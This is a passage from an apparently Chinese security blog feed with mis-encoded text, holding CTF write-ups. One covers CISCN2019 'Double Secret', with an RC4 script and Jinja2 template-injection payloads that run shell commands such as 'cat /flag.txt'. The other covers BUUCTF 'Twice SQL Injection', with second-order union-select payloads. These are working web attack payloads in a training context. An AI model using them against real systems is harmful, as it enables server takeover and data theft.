title="rc4åŠ å¯†è„šæœ¬:"></a>rc4åŠ å¯†è„šæœ¬:</h2><p>[<a href="https://www.cnblogs.com/h3zh1/p/12653579.html">CISCN2019 åä¸œå—èµ›åŒº]Double Secret - ä½•æ­¢(h3zh1) - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="å¯†é’¥"><a href="#å¯†é’¥" class="headerlink" title="å¯†é’¥:"></a>å¯†é’¥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">HereIsTreasure<br></code></pre></td></tr></table></figure><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br><span class="hljs-keyword">from</span> urllib import parse<br><br>def <span class="hljs-title function_ invoke__">rc4_main</span>(key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span>):<span class="hljs-comment">#è¿”å›åŠ å¯†åå¾—å†…å®¹</span><br>    s_box = <span class="hljs-title function_ invoke__">rc4_init_sbox</span>(key)<br>    crypt = <span class="hljs-title function_ invoke__">str</span>(<span class="hljs-title function_ invoke__">rc4_excrypt</span>(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br>def <span class="hljs-title function_ invoke__">rc4_init_sbox</span>(key):<br>    s_box = <span class="hljs-keyword">list</span>(<span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>)) <br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-title function_ invoke__">ord</span>(key[i % <span class="hljs-title function_ invoke__">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br>def <span class="hljs-title function_ invoke__">rc4_excrypt</span>(plain, box):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s in plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-title function_ invoke__">join</span>(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-title function_ invoke__">str</span>(base64.<span class="hljs-title function_ invoke__">b64encode</span>(cipher.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#æ­¤å¤„ä¸ºå¯†æ–‡</span><br>message = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ˜æ–‡:\n&quot;</span>)<br>enc_base64 = <span class="hljs-title function_ invoke__">rc4_main</span>( key , message )<br>enc_init = <span class="hljs-title function_ invoke__">str</span>(base64.<span class="hljs-title function_ invoke__">b64decode</span>(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.<span class="hljs-title function_ invoke__">quote</span>(enc_init)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;</span>+enc_url)<br><span class="hljs-comment">#print(&quot;rc4åŠ å¯†åçš„base64ç¼–ç &quot;+enc_base64)</span><br><br></code></pre></td></tr></table></figure><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•:"></a>æµ‹è¯•:</h3><p><img src="/images/2024-2-18/image-20240214221658127.png" alt="image-20240214221658127"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?secret=d%5D%0A<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214221817599.png" alt="image-20240214221817599"></p><p>æˆåŠŸå›æ˜¾123ï¼ï¼ï¼</p><h2 id="ä½¿ç”¨rc4åŠ å¯†è„šæœ¬åŠ å¯†æˆ‘ä»¬çš„payload"><a href="#ä½¿ç”¨rc4åŠ å¯†è„šæœ¬åŠ å¯†æˆ‘ä»¬çš„payload" class="headerlink" title="ä½¿ç”¨rc4åŠ å¯†è„šæœ¬åŠ å¯†æˆ‘ä»¬çš„payload:"></a>ä½¿ç”¨rc4åŠ å¯†è„šæœ¬åŠ å¯†æˆ‘ä»¬çš„payload:</h2><h3 id="éœ€è¦åŠ å¯†çš„payload"><a href="#éœ€è¦åŠ å¯†çš„payload" class="headerlink" title="éœ€è¦åŠ å¯†çš„payload:"></a>éœ€è¦åŠ å¯†çš„payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222412400.png" alt="image-20240214222412400"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">rc4åŠ å¯†åçš„urlç¼–ç :.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%14%C2%B7%C2%90I%3A0%C3%A1%C2%BB.%C3%B0%C2%87%C3%B8K%0C%C3%9BL%24%22%C3%B1%C2%B8X%C3%8D%C3%BE%C3%83o%C3%BA%C2%B8%C3%88l%C2%97eH%C2%BD%C2%BA%C2%9A%C2%93R2%C3%95%C3%AB%C3%AF%1A%C2%AA%21%C2%85%C2%BCqZ%22g<br></code></pre></td></tr></table></figure><h2 id="è·å–ç½‘é¡µçš„æ ¹ç›®å½•"><a href="#è·å–ç½‘é¡µçš„æ ¹ç›®å½•" class="headerlink" title="è·å–ç½‘é¡µçš„æ ¹ç›®å½•:"></a>è·å–ç½‘é¡µçš„æ ¹ç›®å½•:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%14%C2%B7%C2%90I%3A0%C3%A1%C2%BB.%C3%B0%C2%87%C3%B8K%0C%C3%9BL%24%22%C3%B1%C2%B8X%C3%8D%C3%BE%C3%83o%C3%BA%C2%B8%C3%88l%C2%97eH%C2%BD%C2%BA%C2%9A%C2%93R2%C3%95%C3%AB%C3%AF%1A%C2%AA%21%C2%85%C2%BCqZ%22g<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222530142.png" alt="image-20240214222530142"></p><p>å‘ç°æˆ‘ä»¬çš„payloadæ²¡æœ‰è¢«è¿‡æ»¤ï¼ŒåŒæ—¶å‘ç°äº†ä¸€ä¸ªflag.txtæ–‡ä»¶</p><h2 id="æŸ¥çœ‹flag-txtæ–‡ä»¶å†…å®¹"><a href="#æŸ¥çœ‹flag-txtæ–‡ä»¶å†…å®¹" class="headerlink" title="æŸ¥çœ‹flag.txtæ–‡ä»¶å†…å®¹:"></a>æŸ¥çœ‹flag.txtæ–‡ä»¶å†…å®¹:</h2><h3 id="éœ€è¦åŠ å¯†çš„payload-1"><a href="#éœ€è¦åŠ å¯†çš„payload-1" class="headerlink" title="éœ€è¦åŠ å¯†çš„payload:"></a>éœ€è¦åŠ å¯†çš„payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="rc4åŠ å¯†payload"><a href="#rc4åŠ å¯†payload" class="headerlink" title="rc4åŠ å¯†payload:"></a>rc4åŠ å¯†payload:</h3><p><img src="/images/2024-2-18/image-20240214222801441.png" alt="image-20240214222801441"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">rc4åŠ å¯†åçš„urlç¼–ç :.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%1B%C2%A5%C3%84I5v%C2%AD%C3%BAi%C3%BE%C3%93%C2%A0%1F%04%C3%95Kx5%C3%B5%C2%BD%14%C3%8C%C3%B5%C3%88%3B%C3%BA%C2%BE%C2%96i%C3%92nB%C2%B0%C2%B5%C3%9C%C2%96%0A4%C2%8B%C3%AE%C2%AA%11%C2%A0%23%C2%8C%C2%A1%23_z<br></code></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%1B%C2%A5%C3%84I5v%C2%AD%C3%BAi%C3%BE%C3%93%C2%A0%1F%04%C3%95Kx5%C3%B5%C2%BD%14%C3%8C%C3%B5%C3%88%3B%C3%BA%C2%BE%C2%96i%C3%92nB%C2%B0%C2%B5%C3%9C%C2%96%0A4%C2%8B%C3%AE%C2%AA%11%C2%A0%23%C2%8C%C2%A1%23_z<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222838942.png" alt="image-20240214222838942"></p><p>flag&#x3D;flag{b19033f8-6ffe-4933-8317-b425829587cc}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_October 2019 Twice SQL Injection</title>
    <link href="/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/"/>
    <url>/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/122059073">buuctf XCTF October 2019 Twice SQL Injection äºŒæ¬¡æ³¨å…¥åŸç†+é¢˜è§£_buuctf october 2019 twice sql injection-CSDNåšå®¢</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240216133954559.png" alt="image-20240216133954559"></p><p>ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œè·Ÿä¹‹å‰ä¸€æ ·ï¼Œå…ˆèµ°ä¸€éç½‘é¡µå…¨éƒ¨çš„ä¸šåŠ¡é€»è¾‘ï¼Œå†æ¥å¯»æ‰¾å­˜åœ¨çš„æ¼æ´ã€‚</p><h3 id="æ³¨å†Œä¸€ä¸ªè´¦æˆ·"><a href="#æ³¨å†Œä¸€ä¸ªè´¦æˆ·" class="headerlink" title="æ³¨å†Œä¸€ä¸ªè´¦æˆ·:"></a>æ³¨å†Œä¸€ä¸ªè´¦æˆ·:</h3><p><img src="/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/Typora_images\image-20240216134117475-1708271061177-1.png" alt="image-20240216134117475"></p><h3 id="ç™»å½•æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·"><a href="#ç™»å½•æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·" class="headerlink" title="ç™»å½•æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·:"></a>ç™»å½•æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·:</h3><p><img src="/images/2024-2-18/image-20240216134717043.png" alt="image-20240216134717043"></p><h3 id="ç™»å½•ç»“æœ"><a href="#ç™»å½•ç»“æœ" class="headerlink" title="ç™»å½•ç»“æœ:"></a>ç™»å½•ç»“æœ:</h3><p><img src="/images/2024-2-18/image-20240216134732502.png" alt="image-20240216134732502"></p><h3 id="éšä¾¿å†™ä¸€ä¸‹infoçš„å†…å®¹"><a href="#éšä¾¿å†™ä¸€ä¸‹infoçš„å†…å®¹" class="headerlink" title="éšä¾¿å†™ä¸€ä¸‹infoçš„å†…å®¹:"></a>éšä¾¿å†™ä¸€ä¸‹infoçš„å†…å®¹:</h3><p><img src="/images/2024-2-18/image-20240216134808298.png" alt="image-20240216134808298"></p><h4 id="å“åº”ç»“æœ"><a href="#å“åº”ç»“æœ" class="headerlink" title="å“åº”ç»“æœ:"></a>å“åº”ç»“æœ:</h4><p><img src="/images/2024-2-18/image-20240216134829651.png" alt="image-20240216134829651"></p><p>æˆ‘ä»¬å†™å…¥çš„å†…å®¹è¢«é‡æ–°å›æ˜¾åˆ°äº†ç½‘é¡µä¸Šï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨mysqlçš„äºŒæ¬¡æ³¨å…¥æ¼æ´ï¼Œå…ˆå°†æˆ‘ä»¬çš„æ•°æ®æ’å…¥åˆ°mysqlä¸­ï¼Œç„¶åå†å–å‡ºæ¥å›æ˜¾åˆ°ç½‘é¡µä¸Šã€‚</p><h2 id="æµ‹è¯•äºŒæ¬¡æ³¨å…¥ï¼š"><a href="#æµ‹è¯•äºŒæ¬¡æ³¨å…¥ï¼š" class="headerlink" title="æµ‹è¯•äºŒæ¬¡æ³¨å…¥ï¼š"></a>æµ‹è¯•äºŒæ¬¡æ³¨å…¥ï¼š</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>info=0&#x27;and&#x27;1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216135226796.png" alt="image-20240216135226796"></p><h4 id="å“åº”ç»“æœ-1"><a href="#å“åº”ç»“æœ-1" class="headerlink" title="å“åº”ç»“æœ:"></a>å“åº”ç»“æœ:</h4><p><img src="/images/2024-2-18/image-20240216135346507.png" alt="image-20240216135346507"></p><p>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å†…å®¹ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¢«åŠ å…¥äº†\ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ™®é€šçš„æ³¨å…¥æ–¹å¼å¤±æ•ˆäº†ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç¡®å®šï¼Œç½‘é¡µæ˜¾ç¤ºçš„Infoçš„å†…å®¹ç¡®å®æ˜¯ä»æ•°æ®åº“ä¸­æ˜¾ç¤ºçš„ï¼Œä¸ç„¶ä¹Ÿä¸ç”¨æ‹…å¿ƒæˆ‘ä»¬ä½¿ç”¨å•å¼•å·è¿›è¡Œå±é™©æ³¨å…¥ï¼Œç›´æ¥å‰ç«¯æ˜¾ç¤ºå°±è¡Œäº†ã€‚</p><p>è¿™é‡Œç”±äºç›´æ¥é‡‡ç”¨äº†\å¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œæ‰€ä»¥å°±åªèƒ½å…ˆæ”¾å¼ƒè¿™ä¸ªæ³¨å…¥ç‚¹äº†ï¼Œæ ¹æ®ç½‘ä¸Šçš„å¸ˆå‚…çš„wpå‘ç°éƒ½æ˜¯å¯¹ç”¨æˆ·åè¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="é€šè¿‡ç”¨æˆ·åæ³¨å…¥è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„ç›®çš„"><a href="#é€šè¿‡ç”¨æˆ·åæ³¨å…¥è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„ç›®çš„" class="headerlink" title="é€šè¿‡ç”¨æˆ·åæ³¨å…¥è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„ç›®çš„:"></a>é€šè¿‡ç”¨æˆ·åæ³¨å…¥è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„ç›®çš„:</h2><h3 id="å­˜åœ¨æ¼æ´çš„sqlè¯­å¥"><a href="#å­˜åœ¨æ¼æ´çš„sqlè¯­å¥" class="headerlink" title="å­˜åœ¨æ¼æ´çš„sqlè¯­å¥:"></a>å­˜åœ¨æ¼æ´çš„sqlè¯­å¥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=south1&#x27;union select DATABASE()#<br>select info from test2 where username = &#x27;south1&#x27;union select DATABASE()#&#x27; and password =123<br>æ²¡æœ‰å¯¹usernameè¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥åˆ°sqlä¸­å¯¼è‡´æ³¨å…¥<br>å½“username=south1çš„è®°å½•ä¸å­˜åœ¨æ—¶ï¼Œå°±åªä¼šå›æ˜¾database()çš„ç»“æœ<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216143523665.png" alt="image-20240216143523665"></p><p><img src="/images/2024-2-18/image-20240216143548066.png" alt="image-20240216143548066"></p><p>æ‰€ä»¥å°†database()çš„å€¼å›æ˜¾åˆ°infoæ‰€åœ¨çš„ç½‘é¡µä½ç½®ä¸Šã€‚</p><h3 id="æ³¨å†Œ"><a href="#æ³¨å†Œ" class="headerlink" title="æ³¨å†Œ:"></a>æ³¨å†Œ:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240219003025465.png" alt="image-20240219003025465"></p><p>è¯¥æ³¨å†Œæ–¹å¼èƒ½å¤Ÿè¢«æˆåŠŸæ³¨å†Œï¼Œä½†æ˜¯ä½¿ç”¨æœ¬åœ°æµ‹è¯•æ—¶ï¼Œè¿™æ˜¯ä¼šå¯¼è‡´æŠ¥é”™çš„ã€‚</p><h4 id="æœ¬åœ°æµ‹è¯•æ³¨å†Œ"><a href="#æœ¬åœ°æµ‹è¯•æ³¨å†Œ" class="headerlink" title="æœ¬åœ°æµ‹è¯•æ³¨å†Œ:"></a>æœ¬åœ°æµ‹è¯•æ³¨å†Œ:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into test2 (username,password) VALUES(&#x27;666&#x27;union select database()#&#x27;,&#x27;123&#x27;) <br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216143742997.png" alt="image-20240216143742997"></p><p>ä½†æ˜¯ç½‘é¡µèƒ½æˆåŠŸæ³¨å†Œï¼Œå°±è¯´æ˜åœ¨æ³¨å†Œç•Œé¢ä¸­ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†â€™\â€˜çš„è½¬ä¹‰ï¼Œæ‰èƒ½è®©è¯¥å†…å®¹è¢«æˆåŠŸæ’å…¥æ•°æ®åº“ã€‚</p><h3 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•:"></a>ç™»å½•:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><h4 id="ç™»å½•ç•Œé¢çš„sqlè¯­å¥çŒœæµ‹"><a href="#ç™»å½•ç•Œé¢çš„sqlè¯­å¥çŒœæµ‹" class="headerlink" title="ç™»å½•ç•Œé¢çš„sqlè¯­å¥çŒœæµ‹:"></a>ç™»å½•ç•Œé¢çš„sqlè¯­å¥çŒœæµ‹:</h4><h5 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from users where username=&#x27;&#x27; and password=&#x27;&#x27;<br>=&gt;<br>select * from users where username=&#x27;666&#x27;union select database()#&#x27; and password=&#x27;123&#x27;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯è¯¥sqlè¯­å¥ï¼Œé‚£ä¹ˆselect * from users where username&#x3D;â€™666â€™å›æ˜¾çš„æ‰€æœ‰å­—æ®µçš„æ•°é‡å°±å’Œselect database()å›æ˜¾çš„å­—æ®µæ•°ä¸åŒï¼Œä»è€Œå¯¼è‡´æŠ¥é”™ï¼ˆ666ç”¨æˆ·ä¸å­˜åœ¨æ—¶ï¼‰ï¼š</p><p><img src="/images/2024-2-18/image-20240216144539591.png" alt="image-20240216144539591"></p><p>åœ¨ç†è®ºä¸Šæ˜¯ä¼šæŠ¥é”™çš„æ— æ³•è¿è¡Œçš„ï¼Œä½†æ˜¯å½“æˆ‘ä»¬åœ¨ç™»å½•ç•Œé¢è¾“å…¥æˆ‘ä»¬çš„ç”¨æˆ·åå’Œå¯†ç æ—¶ï¼Œå´æˆåŠŸç™»å½•å¹¶å›æ˜¾äº†database()çš„ä¿¡æ¯:</p><p><img src="/images/2024-2-18/image-20240216144705561.png" alt="image-20240216144705561"></p><h4 id="å¾—åˆ°æ•°æ®åº“ä¿¡æ¯ä¸º-ctftraining-è¯´æ˜åœ¨ç™»å½•ç•Œé¢ä¸Šçš„sqlè¯­å¥åº”è¯¥ä¸º"><a href="#å¾—åˆ°æ•°æ®åº“ä¿¡æ¯ä¸º-ctftraining-è¯´æ˜åœ¨ç™»å½•ç•Œé¢ä¸Šçš„sqlè¯­å¥åº”è¯¥ä¸º" class="headerlink" title="å¾—åˆ°æ•°æ®åº“ä¿¡æ¯ä¸º:ctftraining,è¯´æ˜åœ¨ç™»å½•ç•Œé¢ä¸Šçš„sqlè¯­å¥åº”è¯¥ä¸º:"></a>å¾—åˆ°æ•°æ®åº“ä¿¡æ¯ä¸º:ctftraining,è¯´æ˜åœ¨ç™»å½•ç•Œé¢ä¸Šçš„sqlè¯­å¥åº”è¯¥ä¸º:</h4><h5 id="sql2"><a href="#sql2" class="headerlink" title="sql2:"></a>sql2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from users where username=&#x27;&#x27; and password=&#x27;&#x27;<br>=&gt;<br>select info from users where username=&#x27;666&#x27;union select database()#&#x27; and password=&#x27;123&#x27;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä½¿select info from users where username&#x3D;â€™666â€™æœç´¢çš„å­—æ®µæ•°é‡å’Œselect database()æ‰€å›æ˜¾çš„å­—æ®µæ•°ä¸€è‡´ï¼Œåˆå› ä¸º666è¿™ä¸ªç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æœ€ç»ˆå›æ˜¾çš„ä¸ºdatabase()çš„ä¿¡æ¯:</p><p><img src="/images/2024-2-18/image-20240216145111102.png" 